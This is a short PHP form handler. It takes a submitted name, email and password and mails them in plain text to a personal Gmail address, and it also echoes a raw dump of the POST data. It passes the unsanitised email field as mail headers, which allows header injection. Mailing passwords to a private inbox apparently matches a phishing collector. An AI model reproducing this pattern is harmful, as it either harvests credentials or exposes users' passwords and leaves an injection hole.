<?php
echo var_dump($_POST);
if ($_SERVER["REQUEST_METHOD"] == "POST") {

  $name = $_POST['name'];
  $email = $_POST['email'];
  $password = $_POST['password'];

  $to = 'vadimdufinec@gmail.com';

 
  $subject = 'Сообщение с сайта';

  
  $body = "Имя: $name\n";
  $body .= "Email: $email\n";
  $body .= "Пароль: $password";

  
  if (mail($to, $subject, $body,$email)) {
 
    echo "Сообщение отправлено";
  } else {
    
    echo "Ошибка при отправке сообщения";
  }
}
?>